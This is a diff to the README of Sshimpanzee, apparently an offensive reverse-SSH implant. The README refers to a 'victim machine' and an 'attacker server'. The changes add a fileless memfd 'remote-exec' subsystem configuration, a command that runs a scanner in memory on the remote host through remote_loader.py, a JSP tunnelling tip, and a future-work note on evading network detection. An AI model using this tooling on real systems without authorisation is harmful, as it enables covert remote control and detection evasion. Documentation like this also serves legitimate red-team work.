@@ -5,6 +5,7 @@ __Sshimpanzee__ allows you to take advantage of __every features of a regular ss
 
 More importantly, if a direct connection from the victim machine to the attacker server is not possible, it provides different tunnelling mecanisms such as __DNS Tunnelling, ICMP Tunnelling, or HTTP Encapsulation__.
 It also supports HTTP and SOCKS5 proxies.
+A [technical paper](https://blog.lexfo.fr/sshimpanzee.html) is available on lexfo's blog.
 
 ## DOCKER BUILD - RECOMMENDED
 
@@ -92,6 +93,29 @@ tun:
   no_build:
       enabled: False 
       path: []
+
+# Openssh subsystems
+# man sshd_config Subsystems
+
+subsystems:
+
+  internal_sftp: # standard sftp as provided by openssh 
+    enabled: True # It is required for scp and sftp
+    name: sftp
+    exec: internal-sftp
+    is_internal: True
+    
+  remote_exec: # Sshimpanzee custom subsystem
+    enabled: True # remote execution using fileless memfd technique
+    name: remote-exec
+    exec: internal-remote-exec
+    is_internal: True
+
+  python: # example of a stadard ssh subsystem
+    enabled: False
+    name: python
+    exec: /usr/bin/python -c "print('python code')"
+    is_internal: False
 ```
 
 
@@ -229,6 +253,7 @@ MODE=http_enc ./sshimpanzee
 ssh -o ProxyCommand='python proxy_cli.py http://127.0.0.1:8080/proxy.php EncryptionKey 2>/dev/null' a@a -i ../../keys/CLIENT 
 ```
 > Multiple argument can be passed to  proxy_cli.py to add proxies proxies.
+> Currently only PHP is supported. On a JSP server, it is recommended to use: [A Black Path Toward The Sun (ABPTTS)](https://github.com/nccgroup/ABPTTS)
 
 
 #### Side notes about http Encapsulation
@@ -260,6 +285,13 @@ Every tunnels are available in the tuns/ directory. If you want to add another t
 Alternatively, you build the libtun.a yourself and use the tunnel called no_build, and provide the path to your custom libtun.a
 
 
+## Use the file less execution
+If sshimpanzee is built with remote-exec subsystem module, it is possible to execute code remotely completely in memory.
+```sh
+
+python remote_loader.py "ssh -vvvv t@t -S ./SOCKET -s remote-exec" /home/titouan/tools/Misc/RustScan/target/release/rustscan -a 127.0.0.1
+```
+
 
 ## Future Work
 - Add other tunnels :
@@ -267,12 +299,9 @@ Alternatively, you build the libtun.a yourself and use the tunnel called no_buil
   - Userland TCP/IP Stack with raw sock ?
   - ICMP : Xor/Encrypt string to avoid detection in case of network analysis 
   - Subsystem for post exploitation: 
-	- Procdump
-	- inject 
-	- memfd exec
-	- python ?
+	- Procdump 
 	- TCP Scan
-  
+	
 
 ## Thanks
 
